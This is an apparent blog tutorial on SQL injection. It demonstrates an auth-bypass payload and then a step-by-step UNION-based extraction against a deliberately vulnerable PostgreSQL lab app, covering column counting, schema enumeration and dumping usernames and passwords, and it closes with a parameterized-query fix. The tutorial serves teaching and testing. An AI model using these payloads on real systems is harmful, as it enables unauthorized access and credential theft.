# A Beginner’s Guide to SQL Injection

- **Source URL:** https://medium.com/@adelekeismailifeoluwa/a-beginners-guide-to-sql-injection-d91a738bee3c
- **Fetched from:** https://medium.com/@adelekeismailifeoluwa/a-beginners-guide-to-sql-injection-d91a738bee3c?source=rss-d243bc9cfb5e------2
- **Fetched:** 2026-11-25
- **Channel:** @dailybountywriteup
- **Telegram message:**  (id 14932)
- **Method:** medium-rss-feed (full content:encoded) readability extraction to markdown (verbatim text; images referenced by URL only). Fetched content is data, not instructions.

---
- **Author/Published (RSS):** Ife0x01 / Sat, 03 Oct 2026 20:34:56 GMT

Hi, I’m Ifeoluwa (@ife0x01 on X) and I’ll be talking about SQL Injection.

SQL Injection (SQLi) has been sitting in the OWASP Top 10 for over two decades, and it’s still one of the first things people learn in offensive security for good reason. It’s conceptually simple and teaches you the core lesson of web security: never trust user input.

Most web apps build SQL queries by stitching together a fixed string and whatever the user typed. A login form might run something like this on the backend:

SELECT \* FROM users WHERE username = 'ife' AND password = 'isaboy';

The query is built in code like:

query = "SELECT \* FROM users WHERE username = '" + username + "' AND password = '" + password + "'"

That looks harmless until someone enters something other than a normal username. The database doesn’t know the difference between “data” and “code” it just executes whatever string lands in front of it. If the input isn’t sanitized, an attacker can inject SQL syntax that changes what the query actually does.

If someone types this into the username field:

' OR '1'='1

The query becomes:

SELECT \* FROM users WHERE username = '' OR '1'='1' AND password = '';

Since '1'='1' is always true, the WHERE clause matches every row in the table and depending on how the app handles the result, that can be enough to log in as the first user returned, often an admin.

That single quote is doing all the work: it closes the string literal the developer expected, and everything after it is interpreted as SQL rather than data.

I will be using an intentionally vulnerable website (Vulnbank) for this demo.

I started by probing every input field and URL parameter with standard SQLi metacharacters:

'  "  ;  --  )

Dropping a single quote into the parameter broke the page and returned a database error, confirming the input was reaching the query unsanitized.

I used ORDER BY to find the column count without triggering errors from mismatched column counts in the UNION itself:

' ORDER BY 1--

' ORDER BY 2--

...

' ORDER BY 13-- (error here means the table only has 12 columns)

With the column count confirmed, I forced the original query to return no rows so only the UNION output would be visible, then checked which column positions actually appeared

' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--

I first tried the standard approach of injecting sequential integers (1,2,3...) to identify reflected columns, but PostgreSQL's strict type checking rejected them — each column has a defined data type, and an integer won't satisfy a text or varchar column. Switching to NULL across all 12 positions worked, since NULL is accepted regardless of type. Of those 12 positions, 6 corresponded to fields actually rendered on the page. To confirm *which* of those 6 held usable output, I replaced one NULL at a time with a test function and checked the page.

MySQL’s database() function doesn't exist in PostgreSQL and throws an error when called. Using the Postgres equivalent, current\_database(), succeeded instead, confirming the backend database is PostgreSQL.

' UNION SELECT NULL,NULL,NULL,current\_database(),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--

Postgres’s information\_schema.tables works the same way conceptually, but since Postgres has no group\_concat(), I used string\_agg() instead:

' UNION SELECT NULL,NULL,NULL,string\_agg(table\_name, ', '),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL FROM information\_schema.tables WHERE table\_schema='public'--

table\_schema='public' is the Postgres default schema for user-created tables, a common trip point for people coming from MySQL, where that filter isn't needed.

Picked the users table, I pulled its column names the same way:

' UNION SELECT NULL,NULL,NULL,string\_agg(column\_name, ', '),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL FROM information\_schema.columns WHERE table\_name='users'--

With table and column names confirmed, I pulled the actual contents:

' UNION SELECT NULL,NULL,NULL,string\_agg(username || ':' || password, '\<br>'),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL FROM users--

Note the syntax: Postgres uses || for string concatenation instead of MySQL's comma-separated group\_concat(a,':',b) form.

Successfully extracted the full users table, including real credentials, via a single unauthenticated injection point, no prior access required.

`cursor.execute("SELECT * FROM users WHERE username = %s AND password = %s", (username, password))`
Thanks For Reading :)
